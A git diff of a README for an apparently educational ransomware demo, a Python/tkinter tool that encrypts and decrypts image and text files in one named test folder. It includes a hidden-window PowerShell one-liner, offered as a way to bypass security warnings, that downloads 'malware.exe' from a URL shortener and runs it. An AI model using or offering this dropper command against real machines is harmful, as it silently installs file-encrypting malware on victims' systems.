@@ -7,9 +7,9 @@
 
 ## What it is 
 
-Simple application made with python and tkinter to demonstrate how an application can encrypt and decrypt your files with extensions {'.txt', '.jpg', '.jpeg', '.png'} in the directory it is ran in.
+Simple application made with python and tkinter to demonstrate how an application can encrypt and decrypt your files with extensions {'.txt', '.jpg', '.jpeg', '.png'} in the directory called TestDirz338
 
-If combined with the PowerShell script below, the application gets downloaded and executed by default in path `{USER}\TestTarget\` 
+If combined with the PowerShell script below, the application gets downloaded and executed in path `{USER}\TestDirz338\` 
 
 Right now the application decrypts all {'.txt', '.jpg', '.jpeg', '.png'} files when user gives up the right password (lihapulla).
 
@@ -20,22 +20,24 @@ Right now the application decrypts all {'.txt', '.jpg', '.jpeg', '.png'} files w
 Download and run the script or .exe file inside a safe folder with no important files (incase something goes wrong) to launch the program and enjoy, for example:
 
 ```
-$ mkdir TestTarget
-$ cd TestTarget
+$ mkdir TestDirz338
+$ cd TestDirz338
 $ ./encrypt.py
 ```
 OR
 
-Make a folder called TestTarget in the path C:/Users/{USER}/
+Make a folder called TestDirz338 in the path C:/Users/{USER}/
 
-![2023-11-28_11-37](https://github.com/therealhalonen/PhishSticks/assets/112076418/f4512e62-048c-42c9-ab48-88620d11aeee)
+![2023-12-05_18-59](https://github.com/therealhalonen/PhishSticks/assets/112076418/6682c7df-debb-40ce-bba0-aea449f228f4)
 
-Bypass security warnings and download & execute the file instantly in TestTarget folder by typing the following code into Run (Win+R) on **Windows**:
+
+Bypass security warnings and download & execute the file instantly in TestDirz338 folder by typing the following code into Run (Win+R) on **Windows**:
 ```
-powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/5e8yp8mf', \"$env:UserProfile\TestTarget\malware.exe\");Start-Process \"$env:UserProfile\TestTarget\malware.exe\" -WorkingDirectory \"$env:UserProfile\TestTarget\""
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/5e8yp8mf', \"$env:UserProfile\TestDirz338\malware.exe\");Start-Process \"$env:UserProfile\TestDirz338\malware.exe\" -WorkingDir \"$env:UserProfile\TestDirz338\""
 ```
-If you don't have a folder called TestTarget and you execute the code above, nothing happens.
+If you don't have a folder called TestDirz338 and you execute the code above, nothing happens. Also trying to run the executable anywhere else raises an error:
 
+![2023-12-05_18-56](https://github.com/therealhalonen/PhishSticks/assets/112076418/85b533aa-ec2b-40af-9d5d-66121cf92b4f)
 
 How it works: https://www.youtube.com/watch?v=glqK_-qdDkw
 
